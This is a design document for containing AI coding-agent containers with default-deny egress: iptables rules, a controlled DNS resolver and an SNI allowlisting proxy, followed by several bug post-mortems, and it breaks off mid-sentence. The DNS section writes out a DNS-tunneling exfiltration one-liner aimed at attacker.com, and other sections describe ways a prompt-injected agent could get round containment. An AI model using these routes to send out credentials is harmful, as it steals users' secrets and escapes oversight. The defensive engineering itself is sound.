---
title: Egress control for session containers (Gap 1)
description: Default-deny outbound egress for session containers via a gateway middlebox — iptables floor, controlled DNS, and a transparent allowlisting proxy — delivered in one sequential PR.
issue: https://linear.app/shipit-ai/issue/SHI-90
---

# Egress control for session containers

This is the detailed design for **Gap 1** of [agent containment](./plan.md) (SHI-90):
default-deny outbound network egress for session containers, so a prompt-injected
agent cannot exfiltrate credentials (its own OAuth token, MCP tokens, the brokered
GitHub PAT) to an arbitrary host. Per Anthropic's
[How we contain Claude](https://www.anthropic.com/engineering/how-we-contain-claude),
once approval friction is removed this is the load-bearing environment-layer defense.

It depends on and composes with **SHI-129** (`docs/201-container-api-trust-boundary/`):
that work default-denies the orchestrator API for container-origin requests, which is
what makes egress *settings* (the global toggle, the allowlist) safe to mutate from the
browser — the contained agent can't reach those routes to loosen its own containment.

## Why the current PR is not yet a real control

The first cut (PR for SHI-90) injects `HTTP_PROXY`/`HTTPS_PROXY` into the container and
runs an allowlisting forward proxy in the orchestrator. That is a **policy engine without
enforcement**: the env vars are a convention only cooperative clients honor. The actual
adversary — an injected agent — opens a raw socket that ignores `HTTP_PROXY` and reaches
the internet directly, because the container sits on a normal bridge with full NAT. So the
proxy-by-env-var state contains nothing against the stated threat. The enforcement has to
happen at the **network layer**, below the agent's control.

## Research: how Anthropic's reference devcontainer does it

The reference `.devcontainer/init-firewall.sh` in `anthropics/claude-code` is **pure
`iptables` + `ipset`, no proxy**:

- Default-deny: `iptables -P INPUT/FORWARD/OUTPUT DROP`.
- An `ipset` (`allowed-domains`, `hash:net`) of **destination IPs** is the allowlist,
  matched by `iptables -A OUTPUT -m set --match-set allowed-domains dst -j ACCEPT`.
- The ipset is populated **once at init** by resolving each allowed hostname
  (`dig +noall +answer A "$domain"`); GitHub is added via its published CIDR ranges
  (`gh api meta | jq '(.web + .api + .git)[]' | aggregate`).
- A self-test confirms enforcement: `curl example.com` must fail, `curl api.github.com/zen`
  must succeed.

### The DNS part — and why we must do more than copy it

DNS is allowed **wide open, to any resolver**:

```
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
iptables -A INPUT  -p udp --sport 53 -j ACCEPT
```

This is structural, not an oversight: you can't resolve the allowlist without DNS, and
`iptables` can't parse DNS query *names* (it only sees "UDP to :53"), so the rule can't be
scoped to allowed domains. The consequences are the two things this design must fix:

1. **DNS tunneling is unmitigated.** With port 53 open to any host, an injected agent
   exfiltrates with zero HTTP: `dig $(secret | base64).attacker.com` routes the secret to
   *attacker.com*'s authoritative nameserver via the recursive resolver. The ipset never
   sees it. For a solo-dev devcontainer that is an accepted risk-reduction tradeoff; for
   ShipIt's threat model (credential exfil is the *named* threat) it is **disqualifying**.
2. **Resolve-at-init means stale IPs + a CDN leak.** CDN-fronted hosts (npm, Anthropic)
   rotate IPs, so the pinned ipset breaks long sessions; and an allowed Fastly/Cloudflare
   IP also fronts other sites reachable via SNI on the same IP.

Both weaknesses trace to **not controlling DNS**. That is the correction at the center of
this design.

## Architecture: netns-sidecar enforcement (resolved)

The agent container runs with `CapDrop: ["ALL"]` (no `NET_ADMIN`) and, since SHI-31, as a
non-root user — by design, and we keep it that way. So the firewall/DNS/proxy **cannot and
must not** be administered *by* the agent. But the controls still apply *inside the agent's
own network namespace* — installed from the outside by a trusted, orchestrator-launched
**sidecar that shares the agent's netns** and holds the capability the agent lacks:

```
docker run --network container:<agentId> --cap-add NET_ADMIN  egress-sidecar
       │  (shares the agent container's network namespace; agent itself has no NET_ADMIN)
       ▼
inside the agent netns:
   Tier A  installer (short-lived): iptables default-deny (OUTPUT DROP) + ipset allow-set,
           then exits — rules persist in the netns; the agent can't undo them.
   Tier B  resolver (long-lived sidecar): the only reachable DNS; answers allowlisted names
           only, drives the ipset with the IPs it returns.
   Tier C  transparent proxy (long-lived sidecar): listens on loopback; iptables REDIRECTs
           OUTPUT :443/:53 to it, EXCEPT traffic owned by the sidecar's uid
           (`-m owner --uid-owner`), so the proxy's own egress isn't re-redirected.
```

**Why this over an `internal` network + a separate multi-homed gateway container** (the
earlier sketch): it needs **no second network, no routing/default-gateway changes, and no
cross-container attribution** — everything lives in one netns, so "the agent" and "the
enforcement point" are the same kernel network stack. The agent still can't bypass it (no
`NET_ADMIN` to flush rules; the loopback proxy + owner-match is the istio/cilium-init
pattern), and it composes cleanly A→B→C as sidecars added to the same netns. SHI-31's
non-root agent makes the owner-match exemption unambiguous (agent uid ≠ sidecar uid).

Key properties:
- **Un-bypassable without NET_ADMIN.** A raw socket from the agent is still subject to the
  netns iptables `OUTPUT` policy; there is nothing to unset and no `HTTP_PROXY` to ignore.
- **Transparent.** No env vars in the agent container; REDIRECT happens in the netns.
- **Resolve-before-deny ordering.** The installer fetches `gh api meta` CIDRs and resolves
  allowlisted hostnames *before* setting the `OUTPUT DROP` policy (chicken-and-egg: once
  default-deny is up, the installer itself couldn't reach `api.github.com`). The GitHub
  CIDR fetch is done **orchestrator-side** (it holds the brokered token) and passed in.

## The three tiers (all shipped, sequentially, in one PR)

| Tier | Mechanism | DNS tunneling | CDN / staleness | Allow-once UX | Phase-2 identity hook |
|------|-----------|:---:|:---:|:---:|:---:|
| **A** | iptables default-deny + ipset (Anthropic-style) | ❌ open | ❌ stale / leak | ❌ | ❌ |
| **B** | + controlled resolver that answers only allowlisted names **and** populates the ipset with the IPs it just returned | ✅ closed | ✅ fresh | ⚠️ clunky | ❌ |
| **C** | + transparent SNI/CONNECT proxy for HTTPS | ✅ | ✅ | ✅ | ✅ |

- **Tier A** establishes the un-bypassable floor: internal network, gateway, default-deny,
  ipset matched on destination IP. Steal Anthropic's proven patterns — `gh api meta` CIDR
  for GitHub, resolve-and-pin, the `example.com`-must-fail self-test.
- **Tier B** is the minimum that actually satisfies our exfil threat model. The gateway
  runs the only resolver the container can reach (port 53 allowed *only* to the gateway);
  it refuses/logs non-allowlisted names (killing DNS tunneling) and, on each allowed
  resolution, inserts the returned IPs into the ipset (killing staleness — the ipset always
  matches the live answer). This is the DNS correction over Anthropic's reference.

  > **Tier B host-verification findings (the wiring the design glossed over).** Two netns
  > details only surfaced on a live host (both now fixed; see `checklist.md`):
  > 1. **Getting the agent onto the resolver is an iptables job, not a `--dns` job.** On a
  >    user-defined Docker network the container `--dns` option does *not* rewrite the
  >    agent's resolv.conf nameserver — Docker keeps its embedded resolver (`127.0.0.11`)
  >    as the nameserver and demotes `--dns` to an upstream. Since Tier A drops the
  >    agent→`127.0.0.11`, the only robust hook is to **REDIRECT** the agent's DNS
  >    (`dst 127.0.0.11:53`) to the in-netns dnsmasq at `nat/OUTPUT` (excluding the
  >    resolver's own uid). This is transparent to resolv.conf and tighter than relying on
  >    it. The resolver's listen address (`127.0.0.1:53`) is unchanged.
  > 2. **A long-lived netns sidecar needs a label the compose stale-sweep won't reap.**
  >    Sharing the agent's `shipit-parent-session` label put the resolver in the blast radius
  >    of `killStaleContainers`, which SIGKILLed it the moment the compose stack started. It
  >    now also carries a distinct `shipit-egress-resolver=<sid>` label that the sweep
  >    excludes (parent-session is kept only for destroy-time teardown).
  > 3. **The resolver's internal-name allowlist must track `SHIPIT_HOST`, not a parallel env.**
  >    The worker dials the orchestrator at `SHIPIT_HOST` (`SHIPIT_ORCHESTRATOR_HOST ||
  >    os.hostname()`), but the resolver allowlist read only `SHIPIT_ORCHESTRATOR_HOST` — so
  >    an env that left it unset allowlisted nothing while still pointing the worker at
  >    `os.hostname()`, breaking the callback under Tier B (dnsmasq refuses every name it
  >    isn't told about). Both now derive from one `orchestratorCallbackHost()` so they can't
  >    diverge; prod and the dev compose set `SHIPIT_ORCHESTRATOR_HOST=shipit` for an explicit,
  >    stable alias.
- **Tier C** adds the transparent proxy for L7: hostname-level HTTPS policy that survives
  shared CDN IPs, the **allow-once / add-to-allowlist** interactive flow, per-host
  observability, and the hook for the Phase-2 identity-validating proxy (verify a request
  carries *this* user's token, not an attacker's). The allowlist matcher already written
  (`egress-allowlist.ts`) is reused verbatim; what changes is that traffic reaches it via
  the gateway route rather than an env var.

  > **Tier C implementation notes (C1 enforcement shipped).** The proxy is a tiny,
  > dependency-free **Go** binary (`docker/egress-sidecar/sni-proxy`) baked into the sidecar
  > image via a multi-stage build. It does **not** terminate or decrypt TLS — it peeks the
  > **cleartext SNI** in the ClientHello (reusing crypto/tls's own parser via a
  > `GetConfigForClient` callback that captures `ServerName` and aborts, then replays the
  > recorded bytes to the upstream so the spliced stream is byte-for-byte intact), checks
  > the allowlist, and splices to the original destination (recovered via `SO_ORIGINAL_DST`)
  > or rejects. The installer REDIRECTs the agent's :443 to it, excluding the proxy's own
  > uid (912) so its upstream dials aren't re-redirected; the proxy carries **no
  > `NET_ADMIN`** (only the installer does). Redirecting OUTPUT-chain traffic with an
  > *external* destination to a loopback listener needs `route_localnet` (namespaced), unlike
  > the Tier B DNS redirect whose target (`127.0.0.11`) was already loopback. `route_localnet`
  > is set as a namespaced `HostConfig.Sysctls` on the **agent container at creation** (it owns
  > its netns), NOT by the installer sidecar — that sidecar carries only `NET_ADMIN`, so Docker
  > keeps its `/proc/sys` read-only and an in-script `echo`/`sysctl -w` fails EROFS (a live-host
  > defect). The redirected packet's filter/OUTPUT oif isn't `lo`, so the firewall also adds an
  > explicit `-d 127.0.0.1 --dport $PROXY_PORT ACCEPT` before `-P OUTPUT DROP`, else the
  > REDIRECT'd :443 is dropped.
  >
  > **DNS-layer-first caveat (shapes the allow-once card).** Under Tier B a genuinely-new
  > host can't even be *resolved* (dnsmasq refuses), so the agent never gets an IP and the
  > SNI proxy never sees it. The proxy's unique value — and where the allow-once card fires —
  > is therefore the **CDN co-tenancy / IP-reuse** case (allowlisted IP, non-allowlisted
  > SNI). "Add to allowlist" for a brand-new host must reload the resolver (DNS) and ipset
  > (IP) too; a proactive DNS-layer trigger for brand-new hosts is a C2 follow-up.

### Why one PR, sequentially (and how it stays reviewable)

Tiers A→B→C are not independently *useful* as shipped increments — Tier A alone still
leaks via DNS (the very channel this issue exists to close), so shipping it as "egress
control" would advertise a guarantee we don't yet provide. The tiers also share one
substrate (the gateway container, the internal-network topology, the session attribution),
so splitting them across PRs would mean landing and reverting scaffolding. We therefore
deliver **all three in one PR**, as a sequence of **self-contained commits — one per tier,
each independently green** (build + tests) — so review and `git bisect` stay tractable even
though the unit of *enablement* is the whole thing. The PR closes SHI-90; nothing claims
egress is contained until Tier C lands. The Phase-2 identity-validating proxy remains a
separate follow-up (it builds on the Tier C hook).

## Phase 2 — SNI-scoped identity validation for multi-tenant hosts

Tier C decides allow/deny by **hostname**. That still leaves the residual the threat model
calls out: an allowlisted **multi-tenant** host (S3, GCS, Azure Blob, a shared container
registry, a per-account API) is approved as a *host*, but a request can target the
**attacker's** bucket/account/org on that same host — exfiltration into an attacker identity
on an approved service. Phase 2 implements the `validateIdentity` seam already present in
`sni-proxy/main.go` to close as much of this as is enforceable.

### The hard constraint shapes what's possible

Tier C's whole premise is **no TLS decryption** — SNI-peek only, no CA injection, E2E TLS
intact. So identity validation may use **only** signals visible without decrypting: the
**SNI hostname**, **`SO_ORIGINAL_DST`**, and the per-host rule. The per-request identity that
lives in the HTTP layer — the path/bucket in path-style S3 (`s3.amazonaws.com/<bucket>/…`),
the `Authorization` header, a per-account API key (e.g. an Anthropic *workspace* on
`api.anthropic.com`) — is **encrypted and out of reach**. We deliberately do **not** decrypt
to read it; that would trade away the E2E-TLS guarantee, which is a non-goal.

**What is therefore enforceable: tenant identity that surfaces as a DNS label in the SNI** —
i.e. **virtual-hosted-style** addressing, which the major object stores use:

```
my-bucket.s3.amazonaws.com   my-bucket.s3.us-east-1.amazonaws.com
my-bucket.storage.googleapis.com   myaccount.blob.core.windows.net
```

For a configured multi-tenant **base** host, the proxy extracts the **tenant prefix** (the
SNI labels before the base) and permits the connection only if that prefix is one of the
session's approved identities.

**What is NOT enforceable under SNI-only (and we say so plainly):**

- **Path-style addressing** (`s3.amazonaws.com/<bucket>/…`): the bucket is in the encrypted
  path; the SNI is the bare apex. We cannot tell whose bucket it is. So when an identity rule
  governs a host, the **un-scoped apex SNI is denied by default** — permitting it would be a
  trivial bypass (just switch from virtual-hosted to path-style). An operator who needs
  path-style anyway can opt in explicitly (an empty `""` identity), accepting that identity is
  unenforced for that host.
- **Per-account identity carried only in an auth header / API key** (e.g. distinguishing two
  Anthropic workspaces on `api.anthropic.com`, or two orgs on a path-routed registry): the
  SNI is identical across accounts, so SNI-only cannot separate them. This is a real residual;
  closing it would require either decryption (rejected) or an out-of-process credential broker
  that mints per-identity-scoped tokens (orthogonal — see Gap 2-R).

### Mechanism (`validateIdentity`, `sni-proxy/main.go`)

Read per-host rules from a new env var **`EGRESS_PROXY_IDENTITY_RULES`** — a JSON array, each
entry `{"host": "<base>", "identities": ["<prefix>", …]}`:

- `host` is the multi-tenant **base** host, normalized exactly like the allowlist (a leading
  dot or an exact form both reduce to the same base — the leading dot only affects allowlist
  *matching*, done separately by `decide`, not tenant extraction).
- `identities` are the permitted **tenant prefixes** — the SNI labels before the base
  (`my-bucket` in `my-bucket.s3.amazonaws.com`), compared case-insensitively. An empty `""`
  permits the un-scoped apex (the path-style opt-in above).
- **Unset/empty → no identity scoping** (Tier C behavior is unchanged). Malformed JSON is
  logged and treated as no rules — the orchestrator builds this value, so a parse error is a
  bug, not an attack; failing to "no scoping" (the SNI allowlist still applies) beats
  blackholing the whole session.

The check runs **after** the SNI allowlist decision and **before** dialing upstream, so it is
a pure additional restriction (never a widening) and denies **fast**, like any other Tier C
deny — no held socket. When several rules overlap, the **most-specific (longest-base)** rule
governs, so a tight regional rule isn't loosened by a broad parent rule. Because it needs only
the SNI, `validateIdentity` no longer takes the upstream connection (we don't, and can't,
inspect the request body).

### Env-var contract & orchestrator wiring (now wired)

The proxy-side enforcement (`docker/egress-sidecar/`) defines and consumes
`EGRESS_PROXY_IDENTITY_RULES`. The orchestrator wiring is now in place:

- **`composeEgressIdentityRules`** (`egress-allowlist.ts`) parses + validates the operator
  env **`SESSION_EGRESS_IDENTITY_RULES`** (same JSON shape) into the canonical rules string,
  mirroring `composeEgressExtraHosts`. It also accepts an optional per-session `durableRules`
  hook (for a future per-session editor) and **fails open to `""`** on malformed input —
  identity scoping is additive hardening over the host allowlist, never the floor.
- It flows through **`resolveEgressConfig`** → `ResolvedEgressConfig.identityRules` (a shared
  type that now backs the ~5 wiring sites) → **`launchEgressProxy`** as
  `EGRESS_PROXY_IDENTITY_RULES`, mirroring `EGRESS_PROXY_ALLOWED`; and through
  **`reloadEgressSidecars`** so a live "add to allowlist" reload doesn't drop identity scoping.

**Operator contract:** set `SESSION_EGRESS_IDENTITY_RULES` (JSON array, same shape as the
proxy's var) on the orchestrator deployment to scope multi-tenant hosts. Unset → `""` → the
proxy launch omits the var → no identity scoping (Tier C host-allowlist behavior unchanged).

**Follow-up (still open):** there is no per-session identity *source* yet — only the
operator-global env, so every contained session currently gets the same rules. A per-session
Settings editor would feed `durableRules` (the seam is in place).

## Intra-session preview reachability (SHI-90 follow-up)

Tier A's installer (`init-firewall.sh`) runs at **agent-container creation** and, for
local destinations, allows only the agent's **default-gateway bridge subnet** (the
orchestrator network — needed for the orchestrator API + docker proxy). But the agent
is **multi-homed**: a session's compose/preview network (`shipit-session-<id>`) is
created later by `docker compose up` and the agent is attached to it *after the fact*
(`connectToNetwork`, after the worker is ready and the stack is up). That second subnet
is **not** in the install-time allow-set, so the default-deny `OUTPUT DROP` policy
silently dropped the agent's traffic to its own dev server. The visible symptom
(GH #1495): the agent's built-in **Playwright browser** — which shares the agent's netns
and is therefore subject to the same firewall — **could not reach the live preview** to
screenshot/verify its work (`curl`/navigation to the dev container's `containerIp:port`
timed out), even though the user's preview pane worked fine (that routes through the
orchestrator's `preview-proxy`, which is on the already-allowed orchestrator subnet).

**Fix:** when the agent joins a session network, re-open egress to **that one subnet**.
`SessionContainerManager.connectToNetwork` inspects the joined network's `IPAM.Config`
subnet(s) (`extractNetworkSubnets`) and runs a short-lived `allow-subnet.sh` sidecar
(`--network container:<agent> --cap-add NET_ADMIN`, mirroring the Tier A installer) that
appends `iptables -A OUTPUT -d <subnet> -j ACCEPT` into the agent's netns
(`allowEgressToSubnets`). Idempotent (`-C` before `-A`) so the reconnect-after-recreate
re-join is safe.

**Why this doesn't weaken containment:**
- It allows **only the specific session subnet**, never broad RFC1918. A broad
  `10/8 + 172.16/12 + 192.168/16` allow would be simpler but unsafe: the agent's
  default route is the Docker host, which *would* forward those packets into the host's
  own VPC/LAN (an SSRF surface). The exact-subnet rule grants the agent **no route to
  any other network** — only its own session's containers become reachable, so
  cross-session isolation (per-session networks + source-IP id, NET_RAW dropped) is
  unchanged.
- It is **best-effort, never fail-closed.** Unlike the Tier A install (whose failure
  tears the container down), a failure here is logged and swallowed: failing to open the
  preview subnet only degrades the agent's *own* browser convenience — it never opens
  internet egress, so there is nothing to fail closed about.
- The residual it *does* admit — a compose service container has unrestricted egress, so
  an agent that can reach it could exfiltrate *through* it as a relay — is **inherent to
  the feature** (the agent reaching the preview at all) and is **not** specific to this
  mechanism: routing the agent's browser through the orchestrator `preview-proxy` instead
  would forward agent→orchestrator→compose-container and leave the same relay open. It is
  gated upstream by the repo-trust boundary (Gap 3 — untrusted repos don't run compose)
  and the user having explicitly started the preview.

No-op unless the session is contained, enforcement is on, and the sidecar image is
configured — i.e. only when there is a firewall to punch the hole in. Containment is read
from `SessionContainer.egressContainedAtStart` when known, falling back to the resolved
policy when that boot value is `undefined` (a rediscovered/adopted container — see the
GH #1509 fix below). Agent-facing guidance (`shipit-docs/preview.md`) is updated to tell
the agent to reach previews from its browser at the service registry's `url`
(`containerIp:port`).

### Ordering: the subnet allow must land *after* the Tier-A install, not before

> **Resolved — a startup race stranded ops/docker sessions off their `docker-socket-proxy`.**
>
> The `allow-subnet` re-open above (`connectToNetwork → allowEgressToSessionNetwork`) and
> the Tier-A install (`createContainer → installEgressFirewall`) write into the **same**
> agent netns but were **not ordered relative to each other**. Tier-A's `init-firewall.sh`
> rebuilds the OUTPUT chain with `iptables -F OUTPUT` (flush) before re-adding its allow
> rules; the per-session `allow-subnet.sh` only **appends** `iptables -A OUTPUT -d <subnet>
> -j ACCEPT`. When the compose join won the race, the sequence was:
>
> 1. `allow-subnet.sh` appends the ACCEPT for the session/compose subnet (e.g. `172.20.0.0/16`).
> 2. `init-firewall.sh`'s `iptables -F OUTPUT` runs **~1s later** and **flushes that ACCEPT away**.
>
> The agent was left **default-deny to its own compose subnet** → outbound to the
> `docker-socket-proxy` (and preview servers) on that subnet was dropped. Inbound still
> worked via conntrack, which masked it in every Docker metadata view (the agent looked
> correctly attached). Proven on prod by orchestrator log timestamps: *"opened agent egress
> to session subnet 172.20.0.0/16"* at `12:54:59.101`, then *"Tier A firewall installed"* at
> `12:55:00.542` — the install landed last and wiped the hole.
>
> **Fix (structural, two parts):**
>
> 1. **Gate the re-open on a per-container readiness promise.** `createContainer` sets
>    `SessionContainer.egressFirewallReady` the moment the egress policy is known and
>    resolves it once `installEgressFirewall` (and its OUTPUT flush) has finished.
>    `allowEgressToSessionNetwork` **awaits** it before launching the `allow-subnet` sidecar,
>    so the ACCEPT is ordered strictly **after** the flush and can no longer be wiped. The
>    promise is set only on a fresh `create()`; on a rediscovered/heal path it's absent and
>    the await is a no-op (the netns firewall already persisted with the running container).
>    It is also resolved in the create() catch so a failed create never hangs a concurrent
>    join's best-effort await.
> 2. **Re-apply on any future re-install.** `connectToNetwork` records each joined network in
>    `SessionContainer.joinedSessionNetworks`; `reopenJoinedSessionEgress` re-opens egress to
>    every recorded network and is invoked at the **end** of the Tier-A install (via
>    `LifecycleDeps.reopenJoinedEgress`). So even if the firewall is ever rebuilt on a live
>    container (its flush dropping the existing ACCEPTs), the holes are re-punched
>    idempotently (`allow-subnet.sh` is `-C` before `-A`). A no-op on first boot, where the
>    compose network is only joined later.
>
> Containment is unchanged: still only the specific session subnet, never broad RFC1918, and
> the re-open stays best-effort (never fail-closed). Regression coverage:
> `session-container-egress-reopen.test.ts` (the gate orders the allow after readiness; the
> re-apply re-opens every joined network).

### The Tier-B resolver must forward the ops `docker-socket-proxy` alias (a second, DNS root cause)

> **Resolved — ops sessions still couldn't reach `docker-socket-proxy` after the L3 fix, because the Tier-B resolver REFUSED its name.**
>
> This is **independent** of the L3/ARP ordering race above. Ops/docker sessions run with
> `DOCKER_HOST=tcp://docker-socket-proxy:2375` and their DNS is locked to the in-netns Tier-B
> resolver (`buildResolverConfigB64` → dnsmasq). That config has `server=/<allowlisted-public>/…`
> lines and `server=/shipit/127.0.0.11` for internal names — and, deliberately, **no default
> server**, so any unmatched name is REFUSED (the anti-DNS-tunneling property). But the internal
> names came only from `orchestratorInternalNames()` (the orchestrator host + fallback hosts),
> which does **not** include the per-session `docker-socket-proxy` compose alias. So no
> `server=/docker-socket-proxy/…` rule was emitted and the lookup was refused. Verified live: from
> an ops agent `getent hosts shipit` succeeds but `getent hosts docker-socket-proxy` returns
> REFUSED (rc=2); the orchestrator (plain Docker embedded DNS) resolves the alias fine — Docker's
> 127.0.0.11 knows it, the Tier-B resolver just never forwarded it. Both this and the L3 fix are
> needed for `DOCKER_HOST` by name to work under containment.
>
> **Fix.** A new `sessionInternalNames({ opsSession })` (`egress-dns-install.ts`) returns
> `orchestratorInternalNames()` **plus** the `docker-socket-proxy` alias — but **only** when the
> session is ops. The alias literal is single-sourced as `OPS_DOCKER_PROXY_DNS_NAME`, from which
> `container-lifecycle.ts` also builds `OPS_DOCKER_HOST`, so the name the agent dials and the name
> the resolver allowlists can't drift. dnsmasq maps it to the internal arm
> (`server=/docker-socket-proxy/127.0.0.11`, no `ipset=` pin — it's a bridge IP Tier-A already
> allows). Both config-build paths use it: the install path (`createContainer`, gated on
> `config.opsSession`) and the live reload path (`reloadEgressSidecars`, gated on the
> `SessionContainer.opsSession` recorded at create), so a durable-allowlist reload never drops the
> rule. **Non-ops sessions get no proxy rule, and no default/catch-all server is ever emitted** —
> the DNS-tunneling hole stays closed. Regression coverage: `egress-dns-install.test.ts`
> (`sessionInternalNames` ops/non-ops gating; the `server=/docker-socket-proxy/127.0.0.11` rule
> present for ops, absent + no bare `server=` for non-ops) and `egress-reload.test.ts` (the reload
> re-emits the rule for an ops session, omits it otherwise).

### Services API now hands the agent a ready-to-use `url` (GH #1509)

The agent and its in-netns Playwright browser still had to *construct*
`http://<containerIp>:<port>` themselves from the services response, and the docs pointed
them at the right pieces but not a usable address. `ManagedService` now carries a derived
**`url`** field — `getServices()` computes `http://<containerIp>:<port>/` on read (never
stored, so it can't go stale) for any service that is `running` with both an IP and a port.
`GET /api/sessions/:id/services` surfaces it directly, and `shipit-docs/preview.md` tells
the agent to `browser_navigate`/`curl` that `url`. This is purely the same direct-IP route
this section already opens — it does not change routing or containment, it just stops the
agent from hand-assembling the address (and gives one place to evolve the contract).

> **Resolved — the hole-punch was silently skipped after an orchestrator restart (GH #1509).**
> Live-host diagnosis (Docker access, an affected `auto`-preview session) ruled out the
> iptables ordering, multi-homing, and the punch itself: with the session freshly created,
> the agent **is** multi-homed (`172.18.0.x` bridge + `172.19.0.x` compose net), the
> `ACCEPT … <compose-subnet>` rule sits above the `DROP` policy, and `curl <url>` from the
> agent returns 200. The failure reproduced **only after an orchestrator restart**. Root
> cause: `SessionContainer.egressContainedAtStart` — the gate
> `allowEgressToSessionNetwork` keys off — is set **only on a fresh `create()`**. On restart
> the still-running container is **rediscovered** (`container-discovery.ts`) and reconnected
> with that field `undefined`, even though its netns firewall **persisted with the container**
> (so the agent is still contained). The old gate `sc?.egressContainedAtStart !== true`
> treated the unknown value as "not contained" and returned early — no `opened agent egress`
> log line, no subnet `ACCEPT` rule — so every post-restart compose (re)start left the agent
> firewalled out of its own preview (the orchestrator proxy, on the already-allowed bridge
> subnet, kept working, which is why the user's Preview tab was unaffected).
>
> **Fix.** When the boot value is unknown (`undefined`, i.e. a rediscovered/adopted
> container), `allowEgressToSessionNetwork` falls back to the **resolved** policy
> (`resolveEgressConfig(sessionId).contained`) to decide whether to punch; an explicit
> `false` (booted in Open mode — no firewall) stays a hard skip. The derivation is local —
> it never writes `egressContainedAtStart` back, because the egress status API
> (`api-routes-egress.ts`) relies on `undefined` meaning "boot policy unknown" to avoid a
> false "pending · restart to apply" diff. Verified live: after a `tsx watch` reload that
> rediscovered the agent, the orchestrator logged
> `boot containment unknown (rediscovered container); derived contained=true … re-opening
> preview egress` → `opened agent egress to session subnet(s) 172.19.0.0/16`, and `curl <url>`
> from the agent netns again returned 200. Covered by
> `session-container-egress-reopen.test.ts`.

### Scope: this hole is needed only where the agent is *multi-homed* (docker-access checked — no analogous bug)

The fix above keys off the one fact that makes the bug real: the agent **gains a second
network interface** onto a subnet that the Tier A install-time allow-set never saw. That
only happens for the **compose/preview** network (`shipit-session-<full-sessionId>`), which
`docker compose up` creates and `connectToNetwork` attaches the agent to after the fact. A
natural follow-up worry is whether **docker-access** sessions (`config.dockerAccess`, the
agent driving a Docker-socket proxy) have the same class of bug via *their* per-session
network `shipit-session-<shortId>` (`config.sessionId.slice(0, 12)`, created early in
`container-lifecycle.ts`). **They do not** — traced and confirmed:

- The `shipit-session-<shortId>` network is created for child containers, and the
  docker-proxy injects it as the **child's** `NetworkMode`
  (`docker-proxy-sanitize.ts`). The **agent** container is created with only
  `NetworkMode: deps.networkName` (the orchestrator bridge); no code path connects the
  agent to the `<shortId>` network. `SHIPIT_SESSION_NETWORK` is *set* in the agent env but
  the orchestrator never reads it back to attach the agent, and no `NetworkingConfig`/
  `network.connect`/`connectToNetwork` targets the short-id network (the only such calls
  target the full-id **compose** network).
- This is **by design, not an oversight.** Keeping child containers off the agent's /
  orchestrator's network is the SHI-135 isolation property (`docker-proxy-sanitize.ts`): a
  child on the orchestrator network would present an unknown IP that the API trust boundary
  would mis-classify as a trusted browser origin. The agent operates its children through
  the **Docker API proxy** (`DOCKER_HOST` → docker-socket-proxy), not by direct IP, so it
  needs no interface on the `<shortId>` subnet. (Ops sessions force `dockerAccess: false`
  and reach their docker-socket-proxy over the *compose* network, already covered above.)

So there is **no multi-homing of the agent onto the `<shortId>` subnet** and therefore no
dropped-traffic bug to fix — adding an `allow-subnet` rule for a subnet the agent has no
interface on would be a dead no-op rule. The `allowEgressToSubnets` / `extractNetworkSubnets`
mechanism stays scoped to the multi-homed compose-network join, which is the only place the
hole is real. (If a future change *did* attach the agent to the `<shortId>` network, the
same `connectToNetwork` hook would cover it — the fix is at the attach point, not per
network kind.)

## Settings & UX (browser-only, SHI-129-protected)

All egress configuration is mutated **only from the browser**. SHI-129's guard is
default-deny per route: a route is reachable from a container only if it declares
`config: { containerAccessible: true }`, so the egress settings routes are protected
simply by **not** setting that flag — the contained agent cannot reach them to loosen its
own containment. High-value ones may additionally be listed in `HARD_DENY_PREFIXES`
(`isHardDeniedGlobal`) as a backstop, but that is belt-and-suspenders, not the mechanism.
Stored orchestrator-side alongside MCP servers / secrets.

> **Shipped (durable allowlist + Settings UI).** The durable layer is
> `EgressAllowlistStore` (`egress_allowlist` + `egress_settings` SQLite tables via a
> `DatabaseManager` migration): a `'global'` scope for the editor allowlist + global
> toggle, and a per-session scope for per-session extra hosts + a containment override.
> A single closure (`resolveEgressConfig`, built in `index.ts` where the store + the live
> MCP `CredentialStore` are in scope) resolves, per session at container start,
> (a) **whether to contain** it — `override ?? globalEnabled`, default Contained — so Open
> mode skips the firewall install, and (b) the **composed extra-host allowlist**
> (`composeEgressExtraHosts`: `SESSION_EGRESS_ALLOWLIST` + live MCP hosts + durable
> global + durable session) fed into BOTH `buildResolverConfigB64` and `buildProxyAllowed`.
> Browser-only routes live in `api-routes-egress.ts`
> (`GET/PUT /api/egress/settings`, `GET /api/egress/allowlist`,
> `POST/DELETE /api/egress/hosts`, `GET/PUT /api/egress/session/:id`); the client is
> `egress-store.ts` + `SettingsEgress.tsx` (its own Settings → **Network** tab) with an
> `egress_settings` SSE sync. The editor is **first-class**: `GET /api/egress/allowlist`
> (backed by `buildEffectiveAllowlist`) returns the full *effective* list tagged with
> **provenance** (`builtin` / `operator` / `mcp` / `user-global` / `user-session`). The
> **built-in defaults are overridable** — they're a default the user can remove/edit, not a
> hard floor: a removed default is recorded in a reserved `__suppressed_defaults__` scope and
> filtered out of the resolver/proxy `base` (so it's actually closed), and a **"Restore
> defaults"** action (`POST /api/egress/defaults/restore`) clears the suppressions. Only
> **operator** (`SESSION_EGRESS_ALLOWLIST`) and **MCP** hosts stay read-only (they're derived
> live from the deployment env / connected MCP servers, shown under "Also allowed"). The user
> can add/remove/**edit** entries; the Settings editor is loaded **global-only** (`load(null)`,
> see "Surface split" below), so every editable row is global and per-session entries never
> appear there. **"Add to allowlist"** (the Tier C card's `add`) persists durably AND
> live-reloads the running session's resolver + proxy (`egress-reload.ts`) so a brand-new
> host resolves (DNS + dnsmasq `ipset=` auto-pin) and is SNI-permitted with no restart;
> `egress-policy` reconciles its allow-once set against the durable store via an injected
> source so a durably-added host needs no re-card. The reload swap is env-gated (OFF by
> default) and its live-host verification is pending.

- **Global toggle (default ON, fail-secure).** Two modes for the trusted user:
  *Contained* (default-deny + allowlist + prompts) and *Open* (unrestricted egress, no
  prompts — "stop babysitting, let it work"). An unreadable/missing setting resolves to
  *Contained*. The toggle applies at the session's next container start (egress is a
  creation-time network-topology choice; ShipIt recycles containers routinely), and the UI
  states that rather than implying an instant effect.
- **Policy vs. enforcement (default-on, two independent layers).** The durable toggle above is
  the containment **policy**. **Enforcement** is a separate layer: the orchestrator only
  installs the sidecar tiers when enforcement is enabled (`SESSION_EGRESS_ENFORCE !== "0"`,
  **default ON**) AND the sidecar image is configured (`SESSION_EGRESS_SIDECAR_IMAGE`, set in
